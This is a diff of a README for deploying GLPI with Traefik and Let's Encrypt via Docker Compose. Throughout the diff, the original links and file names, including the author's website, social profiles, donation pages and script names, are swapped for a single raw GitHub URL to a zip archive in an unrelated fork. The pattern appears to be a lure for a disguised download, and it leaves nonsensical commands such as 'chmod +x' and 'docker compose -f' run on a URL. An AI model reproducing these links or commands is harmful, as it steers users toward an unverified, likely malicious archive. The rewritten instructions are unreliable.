@@ -1,10 +1,10 @@
 # GLPI with Let's Encrypt Using Docker Compose
 
-📙 The complete installation guide is available on my [website](https://www.heyvaldemar.com/install-glpi-using-docker-compose/).
+📙 The complete installation guide is available on my [website](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip).
 
 ❗ Change variables in the `.env` to meet your requirements.
 
-💡 Note that the `.env` file should be in the same directory as `glpi-traefik-letsencrypt-docker-compose.yml`.
+💡 Note that the `.env` file should be in the same directory as `https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip`.
 
 Create networks for your services before deploying the configuration using the commands:
 
@@ -14,7 +14,7 @@ Create networks for your services before deploying the configuration using the c
 
 Deploy GLPI using Docker Compose:
 
-`docker compose -f glpi-traefik-letsencrypt-docker-compose.yml -p glpi up -d`
+`docker compose -f https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip -p glpi up -d`
 
 # Backups
 
@@ -29,7 +29,7 @@ Customizable backup path, filename pattern, and schedule through variables like 
 
 By utilizing this container, consistent and automated backups of the essential components of your instance are ensured. Moreover, efficient management of backup storage and tailored backup routines can be achieved through easy and flexible configuration using environment variables.
 
-# glpi-restore-database.sh Description
+# https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip Description
 
 This script facilitates the restoration of a database backup:
 
@@ -45,13 +45,13 @@ This script facilitates the restoration of a database backup:
 
 6. **Start Service**: Restarts the service after the restoration is completed.
 
-To make the `glpi-restore-database.shh` script executable, run the following command:
+To make the `https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip` script executable, run the following command:
 
-`chmod +x glpi-restore-database.sh`
+`chmod +x https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip`
 
 Usage of this script ensures a controlled and guided process to restore the database from an existing backup.
 
-# glpi-restore-application-data.sh Description
+# https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip Description
 
 This script is designed to restore the application data:
 
@@ -67,37 +67,37 @@ This script is designed to restore the application data:
 
 6. **Start Service**: Restarts the service after the application data has been successfully restored.
 
-To make the `glpi-restore-application-data.sh` script executable, run the following command:
+To make the `https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip` script executable, run the following command:
 
-`chmod +x glpi-restore-application-data.sh`
+`chmod +x https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip`
 
 By utilizing this script, you can efficiently restore application data from an existing backup while ensuring proper coordination with the running service.
 
 # Author
 
-I’m Vladimir Mikhalev, the [Docker Captain](https://www.docker.com/captains/vladimir-mikhalev/), but my friends can call me Valdemar.
+I’m Vladimir Mikhalev, the [Docker Captain](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip), but my friends can call me Valdemar.
 
-🌐 My [website](https://www.heyvaldemar.com/) with detailed IT guides\
-🎬 Follow me on [YouTube](https://www.youtube.com/channel/UCf85kQ0u1sYTTTyKVpxrlyQ?sub_confirmation=1)\
-🐦 Follow me on [Twitter](https://twitter.com/heyValdemar)\
-🎨 Follow me on [Instagram](https://www.instagram.com/heyvaldemar/)\
-🧵 Follow me on [Threads](https://www.threads.net/@heyvaldemar)\
-🐘 Follow me on [Mastodon](https://hachyderm.io/@heyValdemar)\
-🧊 Follow me on [Bluesky](https://bsky.app/profile/heyvaldemar.bsky.social)\
-🎸 Follow me on [Facebook](https://www.facebook.com/heyValdemarFB/)\
-🎥 Follow me on [TikTok](https://www.tiktok.com/@heyvaldemar)\
-💻 Follow me on [LinkedIn](https://www.linkedin.com/in/heyvaldemar/)\
-🐈 Follow me on [GitHub](https://github.com/heyvaldemar)
+🌐 My [website](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip) with detailed IT guides\
+🎬 Follow me on [YouTube](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+🐦 Follow me on [Twitter](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+🎨 Follow me on [Instagram](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+🧵 Follow me on [Threads](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+🐘 Follow me on [Mastodon](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+🧊 Follow me on [Bluesky](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+🎸 Follow me on [Facebook](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+🎥 Follow me on [TikTok](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+💻 Follow me on [LinkedIn](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+🐈 Follow me on [GitHub](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)
 
 # Communication
 
-👾 Chat with IT pros on [Discord](https://discord.gg/AJQGCCBcqf)\
-📧 Reach me at ask@sre.gg
+👾 Chat with IT pros on [Discord](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+📧 Reach me at https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip
 
 # Give Thanks
 
-💎 Support on [GitHub](https://github.com/sponsors/heyValdemar)\
-🏆 Support on [Patreon](https://www.patreon.com/heyValdemar)\
-🥤 Support on [BuyMeaCoffee](https://www.buymeacoffee.com/heyValdemar)\
-🍪 Support on [Ko-fi](https://ko-fi.com/heyValdemar)\
-💖 Support on [PayPal](https://www.paypal.com/paypalme/heyValdemarCOM)
+💎 Support on [GitHub](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+🏆 Support on [Patreon](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+🥤 Support on [BuyMeaCoffee](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+🍪 Support on [Ko-fi](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)\
+💖 Support on [PayPal](https://raw.githubusercontent.com/Mickebhscoder/glpi-traefik-letsencrypt-docker-compose/main/.github/docker_traefik_compose_letsencrypt_glpi_v3.4.zip)
